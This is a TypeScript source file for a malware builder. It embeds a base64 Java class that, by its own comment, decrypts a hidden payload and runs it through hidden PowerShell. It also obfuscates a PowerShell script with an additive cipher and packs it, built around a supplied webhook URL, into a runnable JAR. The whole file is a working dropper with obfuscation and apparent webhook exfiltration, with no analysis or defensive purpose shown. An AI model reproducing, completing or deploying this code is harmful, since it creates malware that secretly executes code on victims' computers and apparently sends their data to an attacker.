// Main.class: reads /assets/data.pak from JAR, decrypts with ADD+90, runs with PowerShell hidden via JNA reflection
// Compiled from Main.java with javac 21 (class file version 65/Java 21)
const MAIN_CLASS_B64 =
  "yv66vgAAADQA6goAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClW" +
  "BwAIAQAQamF2YS9sYW5nL1N0cmluZwgACgEABVVURi04CgAHAAwMAAUADQEAFyhbQkxqYXZhL2xh" +
  "bmcvU3RyaW5nOylWBwAPAQATamF2YS9sYW5nL0V4Y2VwdGlvbggAEQEAAAoAEwAUBwAVDAAWABcX" +
  "AQAPamF2YS9sYW5nL0NsYXNzAQAKZ2V0TWV0aG9kcwEAdClbTGphdmEvbGFuZy9yZWZsZWN0L01l" +
  "dGhvZDsKABkAGgcAGwwAHAAdAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAHZ2V0TmFtZREA" +
  "FCgpTGphdmEvbGFuZy9TdHJpbmc7CgAHAB8MACAAIQEABmVxdWFscwEAFShMamF2YS9sYW5nL09i" +
  "amVjdDspWgoAGQAjDAAkACUBABFnZXRQYXJhbWV0ZXJUeXBlcwEAFCgpW0xqYXZhL2xhbmcvQ2xh" +
  "c3M7CgAnACgHACkMACAAKgEAEGphdmEvdXRpbC9BcnJheXMBACkoW0xqYXZhL2xhbmcvT2JqZWN0" +
  "O1tMamF2YS9sYW5nL09iamVjdDspWgcALAEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFt" +
  "CgArAAMKAC8AMAcAMQwAMgAzAQATamF2YS9pby9JbnB1dFN0cmVhbQEABHJlYWQBAAUoW0IpSQoA" +
  "KwA1DAA2ADcBAAV3cml0ZQEAByhbQklJKVYKAC8AOQwAOgAGAQAFY2xvc2UKACsAPAwAPQA+AQAL" +
  "dG9CeXRlQXJyYXkBAAQoKVtCCgBAAEEHAEIMAEMABgEABE1haW4BAANydW4KAEAARQwARgBHAQAB" +
  "eAEAFihbSSlMamF2YS9sYW5nL1N0cmluZzsKABMASQwASgBLAQATZ2V0UmVzb3VyY2VBc1N0cmVh" +
  "bQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvaW8vSW5wdXRTdHJlYW07CgBAAE0MAE4ATwEA" +
  "AnJkAQAZKExqYXZhL2lvL0lucHV0U3RyZWFtOylbQgoAUQBSBwBTDABUAFUBAAxqYXZhL2lvL0Zp" +
  "bGUBAA5jcmVhdGVUZW1wRmlsZQEANChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmlu" +
  "ZzspTGphdmEvaW8vRmlsZTsKAFEAVwwAWAAGAQAMZGVsZXRlT25FeGl0BwBaAQAYamF2YS9pby9G" +
  "aWxlT3V0cHV0U3RyZWFtCgBZAFwMAAUAXQEAEShMamF2YS9pby9GaWxlOylWCgBZAF8MADYAYAEA" +
  "BShbQilWCgBZADkHAGMBABNqYXZhL2xhbmcvVGhyb3dhYmxlCgBiAGUMAGYAZwEADWFkZFN1cHBy" +
  "ZXNzZWQBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYKAFEAiQwAagAdAQAPZ2V0QWJzb2x1dGVQ" +
  "YXRoCgATAGwMAG0AbgEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcv" +
  "Q2xhc3M7CgBAAHAMAHEAcgEAAmdtAQBRKExqYXZhL2xhbmcvQ2xhc3M7TGphdmEvbGFuZy9TdHJp" +
  "bmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7BwB0AQATW0xq" +
  "YXZhL2xhbmcvT2JqZWN0OwgAdgEABE5VTEwKABMAeAwAeQB6AQAIZ2V0RmllbGQBAC0oTGphdmEv" +
  "bGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsKAHwAfQcAfgwAfwCAAQAXamF2" +
  "YS9sYW5nL3JlZmxlY3QvRmllbGQBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xh" +
  "bmcvT2JqZWN0OwkAggCDBwCEDACFAIYBAA5qYXZhL2xhbmcvTG9uZwEABFRZUEUBABFMamF2YS9s" +
  "YW5nL0NsYXNzOwkAiACDBwCJAQARamF2YS9sYW5nL0ludGVnZXIJAIsAgwcAjAEAD2phdmEvbGFu" +
  "Zy9TaG9ydAoAEwCODACPAJABAA5nZXRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzcztd" +
  "KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsHAFoBABdqYXZhL2xhbmcvcmVmbGVjdC9D" +
  "b25zdHJ1Y3RvcgEAC25ld0luc3RhbmNlAQAnKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFu" +
  "Zy9PYmplY3Q7CgAZAJ4DAJ8AoAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEv" +
  "bGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwoBAAoAiACiDACVAKMBABYoSSlMamF2YS9s" +
  "YW5nL0ludGVnZXI7BQAAAAAAAAAAPAUAAAAAAAABACgCLAKpDACVAKoBABQoUylMamF2YS9sYW5n" +
  "L1Nob3J0OwUA";

import { buildPs1 } from "./ps1.js";
import { createRequire } from "module";
const require = createRequire(import.meta.url);

/**
 * Encrypts the PS1 payload using a simple key-based addition cipher.
 * The Java side decrypts by subtracting the key.
 */
function encryptPayload(ps1: string | Buffer): Buffer {
  const data = Buffer.isBuffer(ps1) ? ps1 : Buffer.from(ps1);
  const key = Math.floor(Math.random() * 254) + 1;
  const encrypted = Buffer.alloc(data.length + 1);
  encrypted[0] = key;
  for (let i = 0; i < data.length; i++) {
    encrypted[i + 1] = (data[i] + key) & 0xff;
  }
  return encrypted;
}

export async function buildJar(webhook: string): Promise<Buffer> {
  const JSZip = require("jszip");
  const zip = new JSZip();

  const ps1 = buildPs1(webhook);
  const encryptedPs1 = encryptPayload(ps1);
  const manifest = "Manifest-Version: 1.0\r\nMain-Class: Main\r\n\r\n";

  zip.file("META-INF/MANIFEST.MF", manifest, { compression: "STORE" });
  zip.file("Main.class", Buffer.from(MAIN_CLASS_B64, "base64"), { compression: "DEFLATE" });
  zip.file("assets/data.pak", encryptedPs1, { compression: "DEFLATE" });

  return await zip.generateAsync({ type: "nodebuffer" });
}
